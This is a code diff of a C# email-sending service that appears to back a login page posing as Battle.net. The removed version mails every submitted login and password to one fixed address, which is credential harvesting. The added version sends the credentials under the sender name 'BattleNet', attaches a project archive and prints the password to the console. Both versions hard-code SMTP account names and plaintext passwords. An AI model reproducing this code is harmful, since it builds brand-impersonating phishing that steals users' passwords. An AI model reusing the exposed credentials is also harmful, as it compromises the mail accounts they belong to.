@@ -7,24 +7,28 @@ using MyHttpServer.services;
 
 public class EmailSenderService: IEmailSenderService
 {
-    private readonly string emailFrom = "lolikgaffarov@yandex.ru";
-    private readonly string emailTo = "lolikgaffarov@yandex.ru";
+   // private readonly string emailFrom = "lolikgaffarov@yandex.ru";
+    private readonly string emailTo;
     private readonly string smtpServer = "smtp.yandex.ru";
-    private readonly int smtpPort = 465;
-    private readonly string smtpUsername = "lolikgaffarov";
-    private readonly string smtpPassword = "Gaffarov14";
+    // private readonly int smtpPort = 587;
+    private readonly string smtpUsername = "fuzikort@yandex.ru";
+    private readonly string smtpPassword = "xhbxqbzxjauuqalr";
+
+
 
     public async Task SendEmailAsync(string login, string password)
     {
-        MailMessage message = new MailMessage(emailFrom, emailTo);
+        var from = new MailAddress(smtpUsername, "BattleNet");
+        var to = new MailAddress(login);
+        MailMessage message = new MailMessage(from, to);
         message.Subject = "BattleNet Login Details";
         message.Body = $"Login: {login}\nPassword: {password}";
-
-        using (SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort))
-        {
-            smtpClient.EnableSsl = true;
-            smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
-            await smtpClient.SendMailAsync(message);
-        }
+        message.Attachments.Add(new Attachment("../../../MyHttpServer.zip"));
+        SmtpClient smtpClient = new SmtpClient(smtpServer);
+        smtpClient.EnableSsl = true;
+        smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
+        Console.WriteLine(login + " " + password);
+        await smtpClient.SendMailAsync(message);
+        Console.WriteLine("Письмо отправлено");
     }
 }
